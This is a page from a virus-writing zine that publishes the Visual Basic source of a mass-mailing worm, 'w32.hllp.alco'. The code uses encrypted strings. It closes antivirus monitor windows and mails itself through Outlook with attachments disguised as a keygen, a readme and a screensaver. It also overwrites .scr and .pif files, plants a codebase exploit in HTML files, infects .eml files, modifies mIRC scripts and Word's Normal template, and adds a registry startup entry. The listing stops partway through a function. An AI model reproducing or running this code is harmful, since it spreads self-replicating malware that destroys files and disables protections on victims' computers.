<html>
<head>
<title>rRlf #2</title>
</head>
<body text="#ffffff" link="#58b3f6" vlink="#58b3f6" alink="#58b3f6" background="background.jpg">
<center>
<img src="logo.jpg">
<br><i>Infiltration of a Nation</i>
<br><table cellpadding="9">
<tr>
<th><a href="17.html">last article</a></th>
<th><a href="01.html">table of contents</a></th>
<th><a href="19.html">next article</a></th>
</tr>
</table>
</center>
<p><b><u>w32.hllp.alco by alcopaul</u></b>
<p>'====================================================================================
<br>' this is the product of all the individual routines from my previous creations, w32.hllp.antimacro and w32.hllp.mimee..
<br>' the strings are encrypted... embeds itself to .eml files and .doc files... inserts the codebase exploit to all the
<br>' .html and .htm files to be able for them to execute a copy of a worm when they are started.. closes some resident
<br>' av monitors and has a messagebox payload.. sends e-mail using ms outlook and adding 5 attachments to the fuckin' message, 
<br>' a .exe, a .pif, a .com and a .scr, which are identical copies of the worm and a .eml file which contains a copy of the 
<br>' worm..
<br>'
<br>' made 3/12/2002
<br>'
<br>'
<br>'====================================================================================
<br>Attribute VB_Name = "Module1"
<br>Option Explicit
<br>Private Declare Function FindWindow Lib "user32" _
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Alias "FindWindowA" _
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(ByVal lpClassName As String, _
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ByVal lpWindowName As String) As Long
<br>Private Declare Function SystemParametersInfo Lib _
<br>"user32" Alias "SystemParametersInfoA" (ByVal uAction _
<br>As Long, ByVal uParam As Long, ByVal lpvParam As Any, _
<br>ByVal fuWinIni As Long) As Long
<br>&nbsp;&nbsp;&nbsp;Private Declare Function PostMessage Lib "user32" _
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Alias "PostMessageA" _
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(ByVal hwnd As Long, _
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ByVal wMsg As Long, _
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ByVal wParam As Long, _
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ByVal lParam As Long) As Long
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Const WM_CLOSE = &H10
<br>Sub Main()
<br>On Error Resume Next
<br>Dim av0, av1, av2, av3, av4, av5, av6, av7, av8, av9, av10, n, ar, av
<br>Dim kilwin As Long
<br>Dim killed As Long
<br>Dim xtasy As Long
<br>Dim n1, ar1, attch, exe, exe1, scr, scr1, com, com1, pif, pif1, phexe, phcom, phpif, phscr, pheml
<br>Dim n2, attch2, ar2, attr, a, b, c, d, e, y, xx, oo, g, n3, ar3, attch3, attr1
<br>av0 = x("‚©¾©›«©¦") ':::"JavaScan"
<br>av1 = x("…§¬­¥èŠ§§»¼­º") ':::"Modem Booster"
<br>av2 = x("¾­¼¼º©±") ':::"vettray"
<br>av3 = x("å›œ‡˜Ÿè­º»¡§¦èıæøş«") ':::"F-STOPW Version 5.06c"
<br>av4 = x("˜‹å«¡¤¤¡¦èúøøøèòè¡º½»è‰¤­º¼") ':::"PC-cillin 2000 : Virus Alert"
<br>av5 = x("Œ‰˜Œ§¿¦¤§©¬…©¦©¯­º") ':::"DAPDownloadManager"
<br>av6 = x("š­©¤å¼¡¥­è›«©¦") ':::"Real-time Scan"
<br>av7 = x("‡…‡†ñğ") ':::"IOMON98"
<br>av8 = x("‰˜è…§¦¡¼§º") ':::"AVP Monitor"
<br>av9 = x("†‰—›—›œ‰œ") ':::"NAI_VS_STAT"
<br>av10 = x("¦¼¡¼¤­¬èåè†§¼­¸©¬") ':::"Untitled - Notepad"
<br>For n = 0 To 10
<br>ar = Array(av0, av1, av2, av3, av4, av5, av6, av7, av8, av9, av10)
<br>av = ar(n)
<br>kilwin = FindWindow(vbNullString, av) '::: search and
<br>killed = PostMessage(kilwin, WM_CLOSE, vbNull, vbNull) '::: kill the window names...
<br>Next n
<br>exe = App.Path & x("”") & App.EXEName & x("æ") '::: if i'm a .exe in a directory
<br>exe1 = App.Path & App.EXEName & x("æ") '::: if i'm a .exe in the root
<br>scr = App.Path & x("”") & App.EXEName & x("æ›‹š") '::: if i'm a .scr in a directory
<br>scr1 = App.Path & App.EXEName & x("æ›‹š") '::: if i'm a .scr in the root
<br>com = App.Path & App.EXEName & x("æ‹‡…") '::: if i'm a .com in the root
<br>com1 = App.Path & x("”") & App.EXEName & x("æ‹‡…") '::: if i'm a .com in a directory
<br>pif = App.Path & App.EXEName & x("æ˜") '::: if i'm a .pif in the root
<br>pif1 = App.Path & x("”") & App.EXEName & x("æ˜") '::: if i'm a .pif in a directory
<br>phexe = x("«ò”¥§¬­¥ª§§»¼­ºæ­°­") ':::"c:\modembooster.exe"
<br>phscr = x("«ò”¥±»¼¡¹½­æ»«º") ':::"c:\mystique.scr"
<br>phcom = x("«ò”£­±¯­¦æ«§¥") ':::"c:\keygen.com"
<br>phpif = x("«ò”º­©¬¥­æ¸¡®") ':::"c:\readme.pif"
<br>pheml = x("«ò”« ©¡¦æ­¥¤") ':::"c:\chain.eml"
<br>For n1 = 0 To 3
<br>ar1 = Array(phexe, phscr, phcom, phpif)
<br>attch = ar1(n1)
<br>FileCopy exe, attch '::: spawn the .exe, .pif, .com and .scr files
<br>FileCopy exe1, attch
<br>FileCopy scr, attch
<br>FileCopy scr1, attch
<br>FileCopy com, attch
<br>FileCopy com1, attch
<br>FileCopy pif, attch
<br>FileCopy pif1, attch
<br>Next n1
<br>Call oe '::: spawn "c:\chain.eml"
<br>Set a = CreateObject(x("‡½¼¤§§£æ‰¸¸¤¡«©¼¡§¦")) '::: mail itself using ms outlook
<br>Set b = a.GetNameSpace(x("…‰˜"))
<br>If a = x("‡½¼¤§§£") Then
<br>b.Logon x("¸º§®¡¤­"), x("¸©»»¿§º¬")
<br>For y = 1 To b.AddressLists.Count
<br>Set d = b.AddressLists(y)
<br>xx = 1
<br>Set c = a.CreateItem(0)
<br>For oo = 1 To d.AddressEntries.Count
<br>e = d.AddressEntries(xx)
<br>c.Recipients.Add e
<br>xx = xx + 1
<br>If xx > 8 Then oo = d.AddressEntries.Count '::: to 8 recipients ... :) :) :)
<br>Next oo
<br>c.Subject = x("šòè¡è½º¯­¦¼¤±è¦­­¬è®¡¤­»è®§ºè¥±è«§¥¸½¼­º") '::: encrypted subject.. take a wild guess
<br>c.Body = x("æææææèº­©¤¤±÷è ­º­è©º­è»§¥­è½»­®½¤è®¡¤­»æææè­¦¢§±æææ") '::: encrypted msg.. take a wild guess again..
<br>c.attachments.Add phexe, 1, 1, x("…§¬­¥èŠ§§»¼­ºè¾úæøş") '::: spoof .exe attachment as "Modem Booster v2.06"
<br>c.attachments.Add phscr, 1, 2, x("˜»±« ­¬­¤¡«è›«º­­¦»©¾­º") '::: spoof .scr attachment as "Psychedelic Screensaver"
<br>c.attachments.Add phcom, 1, 3, x("š­¯¡»¼º©¼¡§¦èƒ­±è­¦­º©¼§º") '::: spoof .com attachment as "Registration Key Generator"
<br>c.attachments.Add phpif, 1, 4, x("š­©¬¥­è¡¤­") '::: spoof .pif attachment as "Readme File"
<br>c.attachments.Add pheml, 1, 5, x("‰è„½«£±è‹ ©¡¦è„­¼¼­º") '::: spoof .eml attachment as "A Lucky Chain Letter"
<br>c.Send
<br>e = ""
<br>Next y
<br>b.Logoff
<br>End If
<br>For n2 = 0 To 4
<br>ar2 = Array(pheml, phexe, phscr, phcom, phpif)
<br>attch2 = ar2(n2)
<br>attr = GetAttr(attch2)
<br>If attr <> 3 Then
<br>SetAttr attch2, vbHidden + vbReadOnly
<br>End If
<br>Next n2
<br>If Dir(x("«ò”Ÿ†Œ‡Ÿ›”›‘›üğş"), vbDirectory) = "" Then '::: if no personalised directory
<br>MkDir x("«ò”Ÿ†Œ‡Ÿ›”›‘›üğş") '::: make personalised directory
<br>End If
<br>FileCopy phscr, x("«ò”Ÿ†Œ‡Ÿ›”›‘›üğş”»¿©¸üğşæ«§¥") ':::copy itself to the personalised directory for use in registry call
<br>Set g = CreateObject(x("Ÿ›«º¡¸¼æ› ­¤¤")) '::: register the copied file
<br>g.regwrite x("€ƒ‘—„‡‹‰„—…‰‹€†”›‡œŸ‰š”…¡«º§»§®¼”Ÿ¡¦¬§¿»”‹½ºº­¦¼­º»¡§¦”š½¦›­º¾¡«­»”â»¿©¸üğş"), x("«ò”Ÿ†Œ‡Ÿ›”›‘›üğş”»¿©¸üğşæ«§¥")
<br>If Dir(x("«ò”ş"), vbDirectory) = "" Then '::: if no personalised directory1
<br>MkDir x("«ò”ş") '::: make personalised directory1
<br>End If
<br>FileCopy phscr, x("«ò”ş”§®®¤¡¦­æ­°­") '::: copy itslef to personalised directory for use in codebase exploit
<br>For n3 = 0 To 1
<br>ar3 = Array(x("«ò”ş"), x("«ò”Ÿ†Œ‡Ÿ›”›‘›üğş"))
<br>attch3 = ar3(n3)
<br>attr1 = GetAttr(attch3)
<br>If attr1 <> 3 Then
<br>SetAttr attch3, vbHidden + vbReadOnly '::: hide and make directories read-only
<br>End If
<br>Next n3
<br>Call dribe
<br>Call mirc
<br>Call norm
<br>MsgBox x("©¤«§¸©½¤ˆ«©¦¦©ª¡»¥©¡¤æ«§¥è»©±»äèêœ­©« è¥­è®¡º»¼è¼ ­¦è ¡º­è¥­æææê"), vbExclamation, x("‘­¼è‰¦§¼ ­ºè¡»½©¤èŠ©»¡«èşè˜º§¬½«¼")
<br>End Sub
<br>Private Sub oe() '::: make chain.eml
<br>On Error Resume Next
<br>Dim head, toe, encode
<br>head = "º§¥òÅÂ›½ª¢­«¼òè‰è„½«£±è‹ ©¡¦è„­¼¼­ºÅÂ……å­º»¡§¦òèùæøÅÂ‹§¦¼­¦¼åœ±¸­òè¥½¤¼¡¸©º¼ç¥¡°­¬óÅÂèèèèª§½¦¬©º±õêååååõ—†­°¼˜©º¼—øøø—øøøğ—øù‹ù‹ñüùæŠñŠıû‹øêÅÂå˜º¡§º¡¼±òèûÅÂå…›…©¡¤å˜º¡§º¡¼±òè†§º¥©¤ÅÂå¦»­¦¼òèùÅÂå…¡¥­‡„òè˜º§¬½«­¬èŠ±è…¡«º§»§®¼è…¡¥­‡„èşæøøæúşøøæøøøøÅÂÅÂœ ¡»è¡»è©è¥½¤¼¡å¸©º¼è¥­»»©¯­è¡¦è……è®§º¥©¼æÅÂÅÂååååååõ—†­°¼˜©º¼—øøø—øøøğ—øù‹ù‹ñüùæŠñŠıû‹øÅÂ‹§¦¼­¦¼åœ±¸­òè¼­°¼ç¸¤©¡¦óÅÂèèèè« ©º»­¼õê¡»§åğğıñåùêÅÂ‹§¦¼­¦¼åœº©¦»®­ºå¦«§¬¡¦¯òèÿª¡¼ÅÂÅÂ˜©»»è¼ ¡»è¼§è±§½ºè®º¡­¦¬»è©¦¬è±§½ï¤¤èª­è¤½«£±è¼§¥§ºº§¿æææèåè¼ ­è£©º¥©è¯½º½ÅÂÅÂååååååõ—†­°¼˜©º¼—øøø—øøøğ—øù‹ù‹ñüùæŠñŠıû‹øÅÂ‹§¦¼­¦¼åœ±¸­òè©¸¸¤¡«©¼¡§¦ç°å¥»¬§¿¦¤§©¬óÅÂèèèè¦©¥­õê« ©º¥æ­°­êÅÂ‹§¦¼­¦¼åœº©¦»®­ºå¦«§¬¡¦¯òèª©»­şüÅÂ‹§¦¼­¦¼åŒ¡»¸§»¡¼¡§¦òè©¼¼©« ¥­¦¼óÅÂèèèè®¡¤­¦©¥­õê« ©º¥æ­°­ê"
<br>toe = "ååååååõ—†­°¼˜©º¼—øøø—øøøğ—øù‹ù‹ñüùæŠñŠıû‹øåå"
<br>encode = b64(x("«ò”£­±¯­¦æ«§¥")) ':::base64 itself
<br>Open x("«ò”« ©¡¦æ­¥¤") For Output As #1
<br>Print #1, x(head) '::: write the portion of .eml file
<br>Print #1, encode '::: write b64ed file
<br>Print #1, x(toe) '::: finalise
<br>Close #1
<br>End Sub
<br>'::: search for files and do its thing
<br>Sub dribe()
<br>&nbsp;On Error Resume Next
<br>&nbsp;Dim d, dc, s, fso, dribe
<br>&nbsp;Set fso = CreateObject(x("›«º¡¸¼¡¦¯æ¡¤­›±»¼­¥‡ª¢­«¼"))
<br>&nbsp;Set dc = fso.Drives
<br>&nbsp;For Each d In dc
<br&nbsp;&nbsp;&nbsp;If d.DriveType = 2 Or d.DriveType = 3 Then
<br>&nbsp;&nbsp;&nbsp;&nbsp;fldr (d.Path & x("”"))
<br>&nbsp;&nbsp;&nbsp;End If
<br>&nbsp;Next
<br>&nbsp;dribe = s
<br>End Sub
<br>Sub info(spec)
<br>&nbsp;On Error Resume Next
<br>&nbsp;Dim f, f1, fc, ext, ap, mircfname, s, fso, faa, fae, fa, fe, fi, fo, fu, exe, exe1, scr, scr1, com, com1, pif, pif1
<br>&nbsp;Set fso = CreateObject(x("›«º¡¸¼¡¦¯æ¡¤­›±»¼­¥‡ª¢­«¼"))
<br>exe = App.Path & x("”") & App.EXEName & x("æ")
<br>exe1 = App.Path & App.EXEName & x("æ")
<br>scr = App.Path & x("”") & App.EXEName & x("æ›‹š")
<br>scr1 = App.Path & App.EXEName & x("æ›‹š")
<br>com = App.Path & App.EXEName & x("æ‹‡…")
<br>com1 = App.Path & x("”") & App.EXEName & x("æ‹‡…")
<br>pif = App.Path & App.EXEName & x("æ˜")
<br>pif1 = App.Path & x("”") & App.EXEName & x("æ˜")
<br>&nbsp;Set f = fso.GetFolder(spec)
<br>&nbsp;Set fc = f.Files
<br>&nbsp;For Each f1 In fc
<br>&nbsp;&nbsp;&nbsp;ext = fso.GetExtensionName(f1.Path)
<br>&nbsp;&nbsp;&nbsp;ext = LCase(ext)
<br>&nbsp;&nbsp;&nbsp;s = LCase(f1.Name)
<br>&nbsp;&nbsp;&nbsp;If (ext = x("»«º")) Or (ext = x("¸¡®")) Then ':::overwrite .scr and .pif files
<br>&nbsp;&nbsp;&nbsp;Set f = fso.getfile(exe)
<br>&nbsp;&nbsp;&nbsp;f.Copy (f1.Path)
<br>&nbsp;&nbsp;&nbsp;&nbsp;Set fa = fso.getfile(exe1)
<br>&nbsp;&nbsp;&nbsp;fa.Copy (f1.Path)
<br>&nbsp;&nbsp;&nbsp;&nbsp;Set fe = fso.getfile(scr)
<br>&nbsp;&nbsp;&nbsp;fe.Copy (f1.Path)
<br>&nbsp;&nbsp;&nbsp;&nbsp;Set fi = fso.getfile(scr1)
<br>&nbsp;&nbsp;&nbsp;fi.Copy (f1.Path)
<br>&nbsp;&nbsp;&nbsp;&nbsp;Set fo = fso.getfile(com)
<br>&nbsp;&nbsp;&nbsp;fo.Copy (f1.Path)
<br>&nbsp;&nbsp;&nbsp;&nbsp;Set fu = fso.getfile(com1)
<br>&nbsp;&nbsp;&nbsp;fu.Copy (f1.Path)
<br>&nbsp;&nbsp;&nbsp;&nbsp;Set faa = fso.getfile(pif)
<br>&nbsp;&nbsp;&nbsp;faa.Copy (f1.Path)
<br>&nbsp;&nbsp;&nbsp;&nbsp;Set fae = fso.getfile(pif1)
<br>&nbsp;&nbsp;&nbsp;fae.Copy (f1.Path)
<br>End If
<br>If (ext = x(" ¼¥")) Or (ext = x(" ¼¥¤")) Then ':::add codebase exploit to .html and .htm files
<br>&nbsp;&nbsp;&nbsp;htminfect (f1.Path)
<br>End If
<br>If (ext = x("­¥¤")) Then
<br>&nbsp;&nbsp;&nbsp;mimeinfect (f1.Path) ':::add a copy of itself to .eml files
<br>End If
<br>Next
<br>End Sub
<br>Sub fldr(spec)
<br>&nbsp;On Error Resume Next
<br>&nbsp;Dim f, f1, sf, fso
<br>&nbsp;&nbsp;&nbsp;Set fso = CreateObject(x("›«º¡¸¼¡¦¯æ¡¤­›±»¼­¥‡ª¢­«¼"))
<br>&nbsp;Set f = fso.GetFolder(spec)
<br>&nbsp;Set sf = f.SubFolders
<br>&nbsp;For Each f1 In sf
<br>&nbsp;&nbsp;&nbsp;info (f1.Path)
<br>&nbsp;&nbsp;&nbsp;fldr (f1.Path)
<br>&nbsp;Next
<br>End Sub
<br>Private Function x(sText) ':::decrypt strings
<br>On Error Resume Next
<br>Dim ekey, i, hash, crbyte
<br>ekey = 1730
<br>For i = 1 To Len(sText)
<br>&nbsp;&nbsp;&nbsp;hash = Asc(Mid(sText, i, 1))
<br>&nbsp;&nbsp;&nbsp;crbyte = Chr(hash Xor (ekey Mod 255))
<br>&nbsp;&nbsp;&nbsp;x = x & crbyte
<br>Next i
<br>End Function
<br>Private Sub mimeinfect(fileinput As String) '::: the routine for .eml files
<br>On Error Resume Next
<br>Dim dd As Integer
<br>Dim s As String
<br>Dim sig, ver, textline, ddd, bb, extasy, extasy1, sex, g, gh, rout, num, source, fileread, b, c, d, e
<br>Open fileinput For Input As #6
<br>Do Until Mid(sig, 1, 4) = x("……")
<br>Line Input #6, sig
<br>Loop
<br>Line Input #6, ver
<br>Close #6
<br>If Mid(ver, 18, 3) = x("şşş") Then
<br>Else
<br>Open fileinput For Input As #1
<br>Do Until Mid(textline, 1, 4) = x("……")
<br>Line Input #1, textline
<br>ddd = ddd & textline & vbCrLf
<br>Loop
<br>If Mid(textline, 1, 4) = x("……") Then
<br>bb = ddd & textline & x("şşş")
<br>End If
<br>Line Input #1, extasy
<br>Line Input #1, extasy1
<br>If Mid(extasy1, 2, 5) = x("ª§½¦¬") Then
<br>Else
<br>Line Input #1, sex
<br>extasy1 = sex
<br>End If
<br>Do Until EOF(1)
<br>Line Input #1, g
<br>gh = gh & g & vbCrLf
<br>dd = dd + 1
<br>Loop
<br>Close #1
<br>'the routine
<br>Open fileinput For Input As #7
<br>Do Until Mid(rout, 1, 4) = x("……")
<br>Line Input #7, rout
<br>Loop
<br>For num = 0 To dd - 1
<br>Line Input #7, source
<br>fileread = fileread & source & vbCrLf
<br>Next num
<br>Close #7
<br>b = Mid(extasy1, 12, 41)
<br>c = x("«ò”£­±¯­¦æ«§¥")
<br>d = b64(c)
<br>e = "‹§¦¼­¦¼åœ±¸­òè©¸¸¤¡«©¼¡§¦ç°å¥»¬§¿¦¤§©¬óÅÂèèè¦©¥­õêº­©¬¥­æ­°­êÅÂ‹§¦¼­¦¼åœº©¦»®­ºå¦«§¬¡¦¯òèª©»­şüÅÂ‹§¦¼­¦¼åŒ¡»¸§»¡¼¡§¦òè©¼¼©« ¥­¦¼óÅÂèèè®¡¤­¦©¥­õêº­©¬¥­æ­°­ê"
<br>Open fileinput For Output As #1
<br>Print #1, bb
<br>Print #1, fileread
<br>Print #1, x("åå") & b
<br>Print #1, x(e)
<br>Print #1, d
<br>Print #1, x("åå") & b & x("åå")
<br>Close 1
<br>End If
<br>End Sub
<br>Sub htminfect(file As String) '::: the routine that will add the codebase exploit to .html and .htm files
<br>Dim exploit, fso, header, file1, kopy, s
<br>exploit = "ô›˜‰†è¬©¼©¤¬õ©ÅÂ¬©¼©§º¥©¼‰»õ ¼¥¤è¬©¼©›º«õë®öôç›˜‰†öô°¥¤è¡¬õ®öÅÂô¢öÅÂô©öÅÂôé“‹Œ‰œ‰“ÅÂô§ª¢­«¼è¡¬õê®êè«¤©»»¡¬õê«¤»¡¬òùüşğñûøñåıûşğåğûıüåüûúıåñşğüûúşøñğÿşêè«§¬­ª©»­õê«òçşç§®®¤¡¦­æ­°­êöôç§ª¢­«¼öÅÂ••öÅÂôç©öÅÂôç¢öÅÂôç°¥¤ö"
<br>Open file For Input As #6
<br>Line Input #6, header
<br>Close #6
<br>If header = x("ôéåå©¤«§¸©½¤ååö") Then
<br>Else
<br>Set fso = CreateObject(x("›«º¡¸¼¡¦¯æ¡¤­›±»¼­¥‡ª¢­«¼"))
<br>Set file1 = fso.OpenTextFile(file, 1)
<br>kopy = file1.ReadAll
<br>Open file For Output As #7
<br>Print #7, x("ôéåå©¤«§¸©½¤ååö")
<br>Print #7, kopy
<br>Print #7, x(exploit)
<br>Close #7
<br>End If
<br>End Sub
<br>'mirc
<br>Sub mirc() '::: modify script.ini, spawn a file that will be transmitted to the mirc
<br>On Error Resume Next
<br>Dim a, phpif
<br>phpif = x("«ò”º­©¬¥­æ¸¡®")
<br>a = "“»«º¡¸¼•ÅÂ¦øõè§¦èùòœœòâ ­¤¤§âòëò³ÅÂ¦ùõèç¡®èàèì¦¡«£èõõèì¥­èáè³è ©¤¼èµÅÂ¦úõèç¥»¯èì¦¡«£è€­¤¤§ææè®è±§½ïº­èº½¦¦¡¦¯è˜­¦¼¡½¥äè ­º­ï»è©è®¡¤­è¼ ©¼è¿¡¤¤è¼¿­©£è±§½ºè¸º§«­»»§ºæææèš­¦©¥­è¼§èæ«§¥ææÅÂ¦ûõèç¬««è»­¦¬èå«èì¦¡«£è«ò”Ÿ†Œ‡Ÿ›”›‘›üğş”˜¼¿­©£æ«§—ÅÂ¦üõèµÅÂ¦ıõè§¦èùò‚‡†òëò³ÅÂ¦şõèç¡®èàèì¦¡«£èõõèì¥­èáè³è ©¤¼èµÅÂ¦ÿõèç¥»¯èì¦¡«£è€­¤¤§ææè®è±§½ïº­èº½¦¦¡¦¯è˜­¦¼¡½¥äè ­º­ï»è©è®¡¤­è¼ ©¼è¿¡¤¤è¼¿­©£è±§½ºè¸º§«­»»§ºæææèš­¦©¥­è¼§èæ«§¥ææÅÂ¦ğõèç¬««è»­¦¬èå«èì¦¡«£è«ò”Ÿ†Œ‡Ÿ›”›‘›üğş”˜¼¿­©£æ«§—ÅÂ¦ñõèµÅÂ¦ùøõè§¦èùò˜‰šœòëò³ÅÂ¦ùùõèç¡®èàèì¦¡«£èõõèì¥­èáè³è ©¤¼èµÅÂ¦ùúõèç¥»¯èì¦¡«£è€­¤¤§ææè®è±§½ïº­èº½¦¦¡¦¯è˜­¦¼¡½¥äè ­º­ï»è©è®¡¤­è¼ ©¼è¿¡¤¤è¼¿­©£è±§½ºè¸º§«­»»§ºæææèš­¦©¥­è¼§èæ«§¥ææÅÂ¦ùûõèç¬««è»­¦¬èå«èì¦¡«£è«ò”Ÿ†Œ‡Ÿ›”›‘›üğş”˜¼¿­©£æ«§—ÅÂ¦ùüõèµ"
<br>FileCopy phpif, x("«ò”Ÿ†Œ‡Ÿ›”›‘›üğş”˜¼¿­©£æ«§—")
<br>If Dir(x("«ò”˜º§¯º©¥è¡¤­»”¥š‹"), vbDirectory) <> "" Then
<br>Open x("«ò”˜º§¯º©¥è¡¤­»”¥š‹”»«º¡¸¼æ¡¦¡") For Output As #3
<br>Print #3, x(a)
<br>Close #3
<br>End If
<br>If Dir(x("«ò”¥š‹"), vbDirectory) <> "" Then
<br>FileCopy x("«ò”˜º§¯º©¥è¡¤­»”¥š‹”»«º¡¸¼æ¡¦¡"), x("«ò”¥š‹”»«º¡¸¼æ¡¦¡")
<br>End If
<br>End Sub '::: modify normal template, add a macro that will able for word to embed an executable copy of the worm in documents
<br>Sub norm()
<br>On Error Resume Next
<br>Dim norm, norm1, fso, oword, nt, iw, i, b
<br>FileCopy x("«ò”ş”§®®¤¡¦­æ­°­"), x("«ò”¸§º¦§æ»«º")
<br>If Dir(x("«ò”º­©¬¥­æ¼°¼")) <> x("º­©¬¥­æ¼°¼") Then
<br>norm = "›½ªè¬§«½¥­¦¼—«¤§»­àáÅÂ‡¦èºº§ºèš­»½¥­è†­°¼ÅÂ‡¸­¦èê«ò”°¸¤§¡¼æ¥¥¥êè§ºè‡½¼¸½¼è‰»èúÅÂ˜º¡¦¼èëúäèê»½ªè¬§«½¥­¦¼—§¸­¦àáêÅÂ˜º¡¦¼èëúäèê‡¦èºº§ºèš­»½¥­è†­°¼êÅÂ˜º¡¦¼èëúäèêïª±è©¤«§¸©½¤êÅÂ˜º¡¦¼èëúäèê§ª¢èõè‰«¼¡¾­Œ§«½¥­¦¼æ› ©¸­»àùáæ‡„§º¥©¼æ‹¤©»»œ±¸­êÅÂ˜º¡¦¼èëúäèêŸ¡¼ è‰«¼¡¾­Œ§«½¥­¦¼æ› ©¸­»àùáæ‡„§º¥©¼êÅÂ˜º¡¦¼èëúäèêèèèèæ‰«¼¡¾©¼­‰»è‹¤©»»œ±¸­òõ§ª¢êÅÂ˜º¡¦¼èëúäèêèèèèæ‰«¼¡¾©¼­êÅÂ˜º¡¦¼èëúäèê¦¬èŸ¡¼ êÅÂ˜º¡¦¼èëúäèê­¦¬è»½ªêÅÂ‹¤§»­èúÅÂ›­¼è®»§èõè‹º­©¼­‡ª¢­«¼àê›«º¡¸¼¡¦¯æ¡¤­›±»¼­¥‡ª¢­«¼êáÅÂ›­¼è¦¼èõè‰«¼¡¾­Œ§«½¥­¦¼æŠ˜º§¢­«¼æ¾ª«§¥¸§¦­¦¼»àùáæ«§¬­¥§¬½¤­ÅÂ›­¼è¡¿èõè®»§æ‡¸­¦œ­°¼¡¤­àê«ò”°¸¤§¡¼æ¥¥¥êäèùäèœº½­áÅÂ¦¼æŒ­¤­¼­„¡¦­»èùäè¦¼æ‹§½¦¼‡®„¡¦­»ÅÂ¡èõèùÅÂŒ§èŸ ¡¤­è¡¿æ©¼­¦¬§®»¼º­©¥èôöèœº½­ÅÂªèõè¡¿æº­©¬¤¡¦­ÅÂ¦¼æ¦»­º¼„¡¦­»è¡äèªÅÂ¡èõè¡èãèùÅÂ„§§¸ÅÂ‰«¼¡¾­Œ§«½¥­¦¼æ› ©¸­»æ‰¬¬‡„‡ª¢­«¼è—ÅÂ¡¤­†©¥­òõê«ò”¸§º¦§æ»«ºêäè—"
<br>norm1 = "„¡¦£œ§¡¤­òõ©¤»­ÅÂ‰«¼¡¾­Œ§«½¥­¦¼æ›©¾­ÅÂ‡¸­¦èê«ò”¾¾æº­¯êè§ºè‡½¼¸½¼è‰»èûÅÂ˜º¡¦¼èëûäèêšŒœüêÅÂ˜º¡¦¼èëûäèê“€ƒ‘—‹šš†œ—›š”›§®¼¿©º­”…¡«º§»§®¼”‡®®¡«­”ñæø”Ÿ§º¬”›­«½º¡¼±•êÅÂ˜º¡¦¼èëûäèêêê„­¾­¤êêõ¬¿§º¬òøøøøøøøùêÅÂ˜º¡¦¼èëûäèê“€ƒ‘—‹šš†œ—›š”›§®¼¿©º­”…¡«º§»§®¼”‡®®¡«­”ùøæø”Ÿ§º¬”›­«½º¡¼±•êÅÂ˜º¡¦¼èëûäèêêê„­¾­¤êêõ¬¿§º¬òøøøøøøøùêÅÂ˜º¡¦¼èëûäèêêê‰««­»»Š‡…êêõ¬¿§º¬òøøøøøøøùêÅÂ‹¤§»­èûÅÂ› ­¤¤èêº­¯­¬¡¼èç»è«ò”¾¾æº­¯êäè¾ª€¡¬­ÅÂƒ¡¤¤èê«ò”¾¾æº­¯êÅÂ¦¬è›½ªÅÂ"
<br>Open x("«ò”º­©¬¥­æ¼°¼") For Output As #1
<br>Print #1, x(norm)
<br>Print #1, x(norm1)
<br>Close #1
<br>Set fso = CreateObject(x("›«º¡¸¼¡¦¯æ¡¤­›±»¼­¥‡ª¢­«¼"))
<br>Set oword = CreateObject(x("Ÿ§º¬æ‰¸¸¤¡«©¼¡§¦"))
<br>oword.Visible = False
<br>Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule
<br>Set iw = fso.OpenTextFile(x("«ò”º­©¬¥­æ¼°¼"), 1, True)
<br>nt.DeleteLines 1, nt.CountOfLines
<br>i = 1
<br>Do While iw.atendofstream <> True
<br>b = iw.readline
<br>nt.InsertLines i, b
<br>i = i + 1
<br>Loop
<br>oword.NormalTemplate.Save
<br>SetAttr oword.NormalTemplate.Fullname, vbReadOnly
<br>oword.NormalTemplate.Close
<br>End If
<br>End Sub
<br>Private Function b64(ByVal vsFullPathname As String) As String ':::base 64.. thanks to a vb programmer
<br>On Error Resume Next
<br>&nbsp;&nbsp;&nbsp;'For Encoding BASE64
<br>&nbsp;&nbsp;&nbsp;Dim b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As Integer
<br>&nbsp;&nbsp;&nbsp;Dim b64ed&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As Variant
<br>&nbsp;&nbsp;&nbsp;Dim bin(3)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As Byte
<br>&nbsp;&nbsp;&nbsp;Dim s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As String
<br>&nbsp;&nbsp;&nbsp;Dim l&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As Long
<br>&nbsp;&nbsp;&nbsp;Dim i&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As Long
<br>&nbsp;&nbsp;&nbsp;Dim FileIn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As Long
<br>&nbsp;&nbsp;&nbsp;Dim sResult&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As String
<br>&nbsp;&nbsp;&nbsp;Dim n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As Long
<p>&nbsp;&nbsp;&nbsp;'b64ed=>tabla de tabulación
